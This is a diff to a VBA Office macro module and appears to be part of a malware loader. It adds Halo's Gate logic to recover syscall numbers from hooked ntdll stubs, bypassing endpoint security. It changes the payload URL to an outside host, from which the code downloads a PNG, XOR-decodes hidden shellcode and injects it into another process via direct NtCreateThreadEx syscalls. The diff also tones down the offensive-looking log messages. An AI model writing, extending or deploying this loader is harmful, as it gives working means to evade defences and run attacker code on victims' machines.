@@ -67,24 +67,56 @@ Private Type SYSTEM_PROCESS_INFORMATION
     ' ... followed by other fields we can skip via offset
 End Type
 
-' Get SSN
+' Get SSN Halo's Gate
 Function GetSyscallNumber(ByVal FunctionName As String) As Long
     Dim pFunc As LongPtr
-    Dim ssn As Integer ' SSNs are 2 bytes (stored in EAX)
+    Dim opcode As Byte
+    Dim ssn As Long
+    Dim offset As Long
+    Dim i As Long
     
-    ' Get the handle to ntdll and find the function address
     pFunc = GetProcAddress(GetModuleHandle("ntdll.dll"), FunctionName)
-    
     If pFunc = 0 Then
         GetSyscallNumber = -1
         Exit Function
     End If
     
-    ' In x64 Windows, the SSN is located 4 bytes into the function stub
-    ' Opcode pattern: 4C 8B D1 B8 [SSN SSN 00 00]
-    CopyMemory ssn, ByVal (pFunc + 4), 2
+    ' 1. Check if the primary function is clean (0xB8 at offset +3)
+    CopyMemory opcode, ByVal (pFunc + 3), 1
+    If opcode = &HB8 Then
+        CopyMemory ssn, ByVal (pFunc + 4), 4
+        GetSyscallNumber = ssn
+        Exit Function
+    End If
     
-    GetSyscallNumber = CLng(ssn)
+    ' 2. Primary is hooked! Let's search neighbors (Halo's Gate strategy)
+    ' In x64 ntdll, standard stubs are 32 bytes (0x20) apart.
+    Debug.Print "Warning: " & FunctionName & " is hooked. Searching neighbors..."
+    
+    For i = 1 To 20 ' Check up to 20 neighbors in both directions
+        ' Search Downwards (Higher memory address = Higher SSN)
+        Dim pDown As LongPtr: pDown = pFunc + (i * &H20)
+        CopyMemory opcode, ByVal (pDown + 3), 1
+        If opcode = &HB8 Then
+            CopyMemory ssn, ByVal (pDown + 4), 4
+            GetSyscallNumber = ssn - i ' Subtract the distance to get original SSN
+            Debug.Print "Success: Resolved SSN via downstream neighbor: " & GetSyscallNumber
+            Exit Function
+        End If
+        
+        ' Search Upwards (Lower memory address = Lower SSN)
+        Dim pUp As LongPtr: pUp = pFunc - (i * &H20)
+        CopyMemory opcode, ByVal (pUp + 3), 1
+        If opcode = &HB8 Then
+            CopyMemory ssn, ByVal (pUp + 4), 4
+            GetSyscallNumber = ssn + i ' Add the distance to get original SSN
+            Debug.Print "Success: Resolved SSN via upstream neighbor: " & GetSyscallNumber
+            Exit Function
+        End If
+    Next i
+    
+    ' If we get here, the hook configuration is wider than our search scope
+    GetSyscallNumber = -1
 End Function
 
 ' --- Core Syscall Execution ---
@@ -156,10 +188,10 @@ Public Sub Syscall_NtClose(ByVal hObject As LongPtr)
     status = ExecuteSyscall(GetSyscallNumber("NtClose"), args)
     
     If status = 0 Then
-        Debug.Print "[+] NtClose: Successfully closed handle 0x" & Hex(hObject)
+        Debug.Print "Success: closed handle 0x" & Hex(hObject)
     Else
         ' Common error: 0xC0000008 (STATUS_INVALID_HANDLE)
-        Debug.Print "[-] NtClose: Failed to close handle 0x" & Hex(hObject) & " | NTSTATUS: 0x" & Hex(status)
+        Debug.Print "Error: Failed to close handle 0x" & Hex(hObject) & " | NTSTATUS: 0x" & Hex(status)
     End If
 End Sub
 
@@ -221,9 +253,8 @@ Public Function Syscall_NtCreateThreadEx(ByVal hProcess As LongPtr, ByVal startA
 
     If status = 0 Then
         Syscall_NtCreateThreadEx = hThread
-        Debug.Print "Thread Created Successfully!"
     Else
-        Debug.Print "Final NtCreateThreadEx Failure: 0x" & Hex(status)
+        Debug.Print "Error: NtCreateThreadEx Failure: 0x" & Hex(status)
     End If
 End Function
 
@@ -294,7 +325,7 @@ Function DownloadAndExtract() As Byte()
     
     ' --- CONFIGURATION ---
     ' Make sure these match your Python script settings
-    imgURL = "https://i.postimg.cc/MWJhK9jn/o.png?dl=1" ' Direct link to your PNG
+    imgURL = "https://soulinkkk1.pythonanywhere.com/images/pig.png" ' Direct link to your PNG
     tempPath = Environ("TEMP") & "\downloaded_payload.png"
     xorKey = &H77
     offsetPixels = 20
@@ -459,11 +490,9 @@ Public Sub TestInjection()
         Dim threadID As Long
         threadID = GetThreadId(hThread)
         
-        Debug.Print "--------------------------------------------------"
-        Debug.Print "[+] SUCCESS: Remote thread spawned!"
-        Debug.Print "[+] Thread Handle: 0x" & Hex(hThread)
-        Debug.Print "[+] Thread ID:     " & threadID
-        Debug.Print "--------------------------------------------------"
+        Debug.Print "Success: Thread created successfully!"
+        Debug.Print "Success: Thread Handle: 0x" & Hex(hThread)
+        Debug.Print "Success: Thread ID:     " & threadID
         
         ' Clean up the handle (the thread continues to run)
         Syscall_NtClose hThread
@@ -475,5 +504,5 @@ Public Sub TestInjection()
 Cleanup:
     ' Final Cleanup: Close the process handle
     Syscall_NtClose hProcess
-    Debug.Print "[*] Injection workflow and cleanup complete."
+    Debug.Print "Success: Injection workflow and cleanup complete."
 End Sub
